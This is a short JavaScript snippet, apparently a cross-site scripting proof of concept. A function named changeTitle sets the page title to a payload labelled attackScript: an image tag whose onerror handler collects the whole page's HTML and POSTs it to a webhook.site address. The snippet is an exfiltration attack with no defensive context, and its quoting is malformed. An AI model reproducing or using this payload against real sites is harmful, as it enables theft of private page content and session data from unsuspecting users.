function changeTitle() {
    var attackScript = "<img src='x' onerror='var html = document.documentElement.outerHTML;var server = new XMLHttpRequest;server.open('POST', 'https://webhook.site/6c81d56f-e76f-44e6-aaba-bf5126b5546c', true);server.setRequestHeader('Content-Type', 'text/plain');server.send(html);'";
    if (document.title != attackScript) {
        document.title = attackScript;
    }
}
